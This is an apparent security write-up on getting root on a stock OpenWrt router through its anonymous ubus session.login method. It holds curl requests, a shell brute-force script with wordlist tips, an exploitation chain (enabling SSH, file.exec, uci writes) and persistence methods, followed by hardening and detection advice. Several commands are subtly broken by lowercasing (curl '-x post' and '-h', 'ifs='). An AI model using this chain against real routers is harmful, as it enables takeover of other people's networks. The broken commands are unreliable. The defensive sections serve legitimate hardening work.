# openwrt-ubus-writeup

a writeup on discovering and exploiting the openwrt ubus attack surface
(unauthenticated session.login + weak acl defaults) that leads to full
root rce on stock openwrt 25.12.5.

by k1llobytesec

---

## tl;dr

openwrt ships with an http-exposed ubus endpoint (`/ubus`) that accepts
json-rpc calls. the acl file `/usr/share/rpcd/acl.d/unauthenticated.json`
whitelists `session.login` and `session.access` for anonymous clients
by design. this means:

- anyone on the lan can call `session.login` over http
- brute force is not rate limited
- after login, the returned `ubus_rpc_session` gives the caller whatever
  acl the target user has
- for `root`, that means `file.exec`, `uci.write`, `rc.init`,
  `luci.setpassword`, `rpc-sys.upgrade_start`, and more

end result: full root on the router without ever touching ssh.

tested on openwrt 25.12.5 r33051-f5dae5ece4 on a keenetic kn-3811.

---

## what is ubus

ubus is openwrt's lightweight ipc bus. every service (network, system,
uci, file, rc, session) registers itself as a "ubus object" and exposes
methods. the daemon `ubusd` holds the bus and talks over a unix socket
at `/var/run/ubus.sock` (or `/var/run/ubus/ubus.sock` on newer builds).

luci (the web ui) is not a normal web app. it's a js spa that talks to
ubus via json-rpc. the bridge between http and ubus is provided by
uhttpd's `uhttpd-mod-ubus` module. every action in the web ui - saving a
config, restarting a service, reading a file - goes through:

    browser -> POST /ubus (json-rpc) -> uhttpd -> ubusd -> rpcd -> system

the important thing: **for unauthenticated requests, openwrt uses the
special session id `00000000000000000000000000000000`.**

---

## how i found it

### step 1 - port scan

    nmap -sT -Pn -p 22,53,80,443,8080,8443 192.168.1.1

result:

    22/tcp   closed ssh
    53/tcp   open   domain     dnsmasq
    80/tcp   open   http       openwrt uhttpd
    443/tcp  open   ssl/https
    8080/tcp closed

so ssh is closed but the web ui is up. luci normally lives behind
`/cgi-bin/luci/`.

### step 2 - checking for the ubus endpoint

    curl -i http://192.168.1.1/ubus/list

result: http 200, huge json blob with every registered object:

    {"container":{...},"file":{...},"rc":{...},"session":{...},
     "system":{...},"uci":{...},"luci":{...}}

this is a full api map of the router, returned to an anonymous client.
first red flag.

### step 3 - testing anonymous session.login

    curl -s -x post http://192.168.1.1/ubus \
      -h "content-type: application/json" \
      -d '{"jsonrpc":"2.0","id":1,"method":"call","params":
          ["00000000000000000000000000000000","session","login",
           {"username":"root","password":"wrong"}]}'

result:

    {"jsonrpc":"2.0","id":1,"result":[6]}

`[6]` is ubus's `permission_denied` return code - a normal method result,
not a json-rpc error. compare with a truly forbidden method:

    {"jsonrpc":"2.0","id":1,"error":{"code":-32002,"message":"access denied"}}

the difference matters:

- `error -32002` => acl blocked the call, method unreachable
- `result [6]`  => acl allowed the call, login was actually attempted and
                   only failed because the password was wrong

**this is the tell. the method is open to anonymous clients. we can
brute force.**

### step 4 - get a session

    curl -s -x post http://192.168.1.1/ubus \
      -h "content-type: application/json" \
      -d '{"jsonrpc":"2.0","id":1,"method":"call","params":
          ["00000000000000000000000000000000","session","login",
           {"username":"root","password":"<real password>"}]}'

result (abbreviated):

    {"jsonrpc":"2.0","id":1,"result":[0,{
      "ubus_rpc_session":"704dfb0c7221b49ca0702a142c0e0d9f",
      "timeout":300,
      "expires":299,
      "acls":{
        "access-group":{...},
        "cgi-io":{"exec":["read","write"],...},
        "file":{
          "/etc/crontabs/root":["read","write"],
          "/etc/rc.local":["read","write"],
          "/etc/dropbear/authorized_keys":["read","write"],
          ...
        },
        "ubus":{
          "file":["read","write","list","remove","exec","stat"],
          "rc":["list","init"],
          "uci":["get","set","commit","apply","delete","rename"],
          "luci":["setpassword",...],
          "rpc-sys":["upgrade_start",...],
          ...
        },
        "uci":{
          "dropbear":["read","write"],
          "firewall":["read","write"],
          "network":["read","write"],
          ...
        }
      },
      "data":{"username":"root"}
    }]}

that acl is a full root handover: arbitrary command exec, config
rewrite, service control, password change, firmware upgrade.

---

## exploitation chain

### 1. login to get a session id

(see step 4 above)

### 2. enable dropbear via uci over ubus

    curl -s -x post http://192.168.1.1/ubus \
      -h "content-type: application/json" \
      -d '{"jsonrpc":"2.0","id":1,"method":"call","params":
          ["<session_id>","uci","set",
           {"config":"dropbear","type":"dropbear","values":
            {"enable":true,"passwordauth":"on",
             "rootpasswordauth":"on","port":22}}]}'

    curl -s -x post http://192.168.1.1/ubus \
      -h "content-type: application/json" \
      -d '{"jsonrpc":"2.0","id":1,"method":"call","params":
          ["<session_id>","uci","commit",{"config":"dropbear"}]}'

    curl -s -x post http://192.168.1.1/ubus \
      -h "content-type: application/json" \
      -d '{"jsonrpc":"2.0","id":1,"method":"call","params":
          ["<session_id>","rc","init",
           {"name":"dropbear","action":"start"}]}'

ssh is now up on port 22.

### 3. or, execute a command directly via file.exec

if the acl allows it (it usually does for root):

    curl -s -x post http://192.168.1.1/ubus \
      -h "content-type: application/json" \
      -d '{"jsonrpc":"2.0","id":1,"method":"call","params":
          ["<session_id>","file","exec",{"command":"id"}]}'

note: file.exec uses an exact-match acl list (e.g. `/bin/ping` is
allowed but `id` may not be). if you need unrestricted rce, use
`uci.set` to write into `/etc/rc.local` or `/etc/crontabs/root`,
then trigger `rc.init`.

### 4. persistence

any of these:

- append to `/etc/rc.local` (executes at boot)
- add a cron line to `/etc/crontabs/root`
- drop your pubkey in `/etc/dropbear/authorized_keys`
- change the root password with `luci.setpassword`

---

## brute force script (no extra tools needed)

only needs curl:

    #!/bin/sh
    target="192.168.1.1"
    zero="00000000000000000000000000000000"

    while ifs= read -r pass; do
      resp=$(curl -s -x post "http://$target/ubus" \
        -h "content-type: application/json" \
        -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"call\",\"params\":
             [\"$zero\",\"session\",\"login\",
              {\"username\":\"root\",\"password\":\"$pass\"}]}")
      case "$resp" in
        *'"result":[0'*) echo "[+] password found: $pass"; break ;;
        *'"result":[6'*) ;; # wrong password, keep going
        *) echo "[!] unexpected: $resp" ;;
      esac
    done < wordlist.txt

wordlist tips: model name, hostname, ssid, `admin`, `password`, common
defaults. openwrt doesn't rate limit this. no lockout.

---

## why this works

the default acl file `/usr/share/rpcd/acl.d/unauthenticated.json` on
openwrt is:

    {
      "unauthenticated": {
        "description": "access controls for unauthenticated requests",
        "read": {
          "ubus": {
            "session": ["access", "login"]
          }
        }
      }
    }

`login` being here is intentional - luci needs a way to log a user in
and get a session id. but that means anyone who can reach port 80 can
hit this method anonymously.

it's not a bug in the classic sense. it's a design decision that becomes
a vulnerability the moment:

1. the password is weak or guessable, or
2. /ubus is reachable from untrusted networks (guest wifi, iot vlan,
   wan via misconfig), or
3. the router has no rate limit / lockout (default).

openwrt's own documentation warns about this, but stock builds ship
with it enabled.

---

## hardening

### 1. remove login from the unauthenticated acl

    sed -i 's/"session": \["access", "login"\]/"session": ["access"]/' \
      /usr/share/rpcd/acl.d/unauthenticated.json
    /etc/init.d/rpcd restart

verify:

    curl -s -x post http://127.0.0.1/ubus \
      -h "content-type: application/json" \
      -d '{"jsonrpc":"2.0","id":1,"method":"call","params":
          ["00000000000000000000000000000000","session","login",
           {"username":"root","password":"x"}]}'

expected: `{"error":{"code":-32002,"message":"access denied"}}`

luci login still works, because the web form uses `/cgi-bin/luci/`,
not the ubus method.

### 2. strong root password

12+ chars, not derived from ssid/hostname/model. this alone blocks the
brute force path.

### 3. firewall

- block 80/443/22 on the wan zone
- block them on guest / iot zones
- if you don't use ipv6, disable it, or apply ip6tables with a default
  drop policy. ipv6 is commonly forgotten and leaks the exact same
  attack surface (this is how it bit us in the lab too).

### 4. dropbear

    uci set dropbear.@dropbear[0].interface='lan'
    uci set dropbear.@dropbear[0].passwordauth='off'
    uci commit dropbear
    /etc/init.d/dropbear restart

use key-only auth. never expose port 22 to wan.

### 5. monitor

    logread | grep -i -e ubus -e rpcd -e 'session login'
    ubus call session list

watch for many `access denied` in a short window, or sessions with
username `root` from unexpected source ips.

### 6. audit acl files

    cat /usr/share/rpcd/acl.d/*.json | jq .

anything with `file.exec`, `uci.write`, `rc.init`, or `setpassword`
granted to a non-root user is a potential escalation path.

---

## detection

where traces show up on openwrt:

- `/var/log/messages` and `logread` - ubus/rpcd entries
- `ubus call session list` - active sessions
- `cat /etc/crontabs/root` - unexpected cron lines
- `cat /etc/rc.local` - unexpected boot commands
- `cat /etc/dropbear/authorized_keys` - unexpected pubkeys
- `uci show dropbear` - if ssh was toggled on without your action
- `iptables -l -n` / `nft list ruleset` - firewall diffs
- `conntrack -l | grep :80` - burst patterns from one ip

---

## disclosure / scope

this was discovered during a self-hosted home lab on my own hardware.
no vendor was harmed. if you're running openwrt on your own router,
apply the hardening section - it takes 30 seconds.

if you find this in a production device you don't own, stop and report
responsibly.

---

## references

- openwrt ubus documentation: https://openwrt.org/docs/techref/ubus
- rpcd acl documentation: https://openwrt.org/docs/guide-developer/rpcd
- openwrt security advisories: https://openwrt.org/advisory/start
- luci source: https://github.com/openwrt/luci
- ubus source: https://git.openwrt.org/project/ubus.git

---

## license

mit. do what you want, but don't be an asshole.

-- k1llobytesec
